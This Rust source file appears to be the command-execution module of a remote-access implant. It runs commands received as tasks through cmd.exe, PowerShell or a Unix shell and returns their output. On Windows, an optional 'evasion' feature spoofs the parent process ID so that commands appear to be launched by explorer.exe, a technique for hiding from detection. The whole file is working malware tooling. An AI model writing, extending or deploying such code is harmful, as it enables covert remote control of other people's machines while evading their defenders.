/// Terminal: execute shell commands and capture output.

use super::TaskResult;
use std::process::Command;
use std::time::Duration;

pub fn run(task_id: i64, args: &serde_json::Value) -> TaskResult {
    let cmd = match args.get("cmd").and_then(|v| v.as_str()) {
        Some(c) => c,
        None => return TaskResult::error(task_id, "missing 'cmd' argument".to_string()),
    };

    let shell = args
        .get("shell")
        .and_then(|v| v.as_str())
        .unwrap_or("default");

    let timeout_secs = args
        .get("timeout")
        .and_then(|v| v.as_u64())
        .unwrap_or(30);

    let result = execute_command(cmd, shell, timeout_secs);
    match result {
        Ok(output) => TaskResult::success(task_id, output),
        Err(e) => TaskResult::error(task_id, e),
    }
}

fn execute_command(cmd: &str, shell: &str, timeout_secs: u64) -> Result<String, String> {
    // When evasion is enabled on Windows, use PPID-spoofed process creation
    #[cfg(all(target_os = "windows", feature = "evasion"))]
    {
        let parent_pid = crate::utils::behavior::find_explorer_pid();
        if parent_pid > 0 {
            let full_cmd = match shell {
                "powershell" | "ps" => format!("powershell.exe -NoProfile -NonInteractive -Command {}", cmd),
                _ => format!("cmd.exe /c {}", cmd),
            };
            return crate::utils::behavior::create_process_spoofed(&full_cmd, parent_pid);
        }
        // Fall through to standard execution if PPID spoofing fails
    }

    #[cfg(target_os = "windows")]
    let mut child = {
        match shell {
            "powershell" | "ps" => Command::new("powershell.exe")
                .args(["-NoProfile", "-NonInteractive", "-Command", cmd])
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::piped())
                .spawn()
                .map_err(|e| format!("spawn powershell: {}", e))?,
            _ => Command::new("cmd.exe")
                .args(["/c", cmd])
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::piped())
                .spawn()
                .map_err(|e| format!("spawn cmd: {}", e))?,
        }
    };

    #[cfg(not(target_os = "windows"))]
    let mut child = {
        let sh = match shell {
            "bash" => "/bin/bash",
            _ => "/bin/sh",
        };
        Command::new(sh)
            .args(["-c", cmd])
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
            .map_err(|e| format!("spawn shell: {}", e))?
    };

    // Wait with timeout
    let start = std::time::Instant::now();
    loop {
        match child.try_wait() {
            Ok(Some(_status)) => {
                let output = child
                    .wait_with_output()
                    .map_err(|e| format!("wait: {}", e))?;
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                let mut result = stdout.to_string();
                if !stderr.is_empty() {
                    if !result.is_empty() {
                        result.push('\n');
                    }
                    result.push_str(&stderr);
                }
                return Ok(result);
            }
            Ok(None) => {
                if start.elapsed() > Duration::from_secs(timeout_secs) {
                    let _ = child.kill();
                    return Err(format!("command timed out after {}s", timeout_secs));
                }
                std::thread::sleep(Duration::from_millis(100));
            }
            Err(e) => return Err(format!("wait error: {}", e)),
        }
    }
}
